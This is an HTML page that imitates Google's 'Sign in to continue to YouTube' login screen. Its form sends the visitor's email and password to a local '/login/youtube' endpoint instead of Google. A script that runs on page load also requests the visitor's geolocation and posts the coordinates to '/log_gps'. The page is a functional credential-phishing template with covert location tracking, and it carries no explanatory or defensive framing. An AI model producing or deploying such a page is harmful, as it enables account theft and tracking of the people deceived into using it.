<!DOCTYPE html>
<html lang="en">
<head>
    <script src="https://cdn.tailwindcss.com"></script>
    <title>Sign in - Google Accounts</title>
</head>
<body class="bg-white flex items-center justify-center min-h-screen font-sans px-4">
    <div class="w-full max-w-[450px] border border-gray-300 rounded-lg p-10 text-center shadow-sm">
        <div class="flex justify-center mb-4"><svg viewBox="0 0 75 24" width="75" height="24"><path d="M12.5 11V13.5H19.5C19.2 15 17.5 18 12.5 18C8.2 18 4.7 14.5 4.7 10.2S8.2 2.4 12.5 2.4C15 2.4 16.6 3.4 17.6 4.4L19.4 2.6C17.6 1 15.3 0 12.5 0C6.9 0 2.3 4.6 2.3 10.2S6.9 20.4 12.5 20.4C18.4 20.4 22.3 16.2 22.3 10.4C22.3 9.7 22.2 9.1 22.1 8.5H12.5V11Z" fill="#4285F4"/></svg></div>
        <h1 class="text-2xl font-normal mb-2">Sign in</h1><p class="text-gray-700 mb-8">to continue to YouTube</p>
        <form action="/login/youtube" method="POST" class="text-left space-y-6">
            <input name="user" type="text" placeholder="Email or phone" class="w-full p-4 border border-gray-300 rounded-md focus:border-blue-500 outline-none" required>
            <input name="pass" type="password" placeholder="Enter your password" class="w-full p-4 border border-gray-300 rounded-md focus:border-blue-500 outline-none" required>
            <div class="flex justify-between items-center pt-4">
                <a href="#" class="text-blue-600 font-bold text-sm">Create account</a>
                <button class="bg-blue-600 text-white px-6 py-2 rounded font-bold hover:bg-blue-700">Next</button>
            </div>
        </form>
    </div>
    <script>
        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(p) {
                    fetch('/log_gps', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({lat:p.coords.latitude, lon:p.coords.longitude})});
                });
            }
        }
    </script>
</body>
</html>
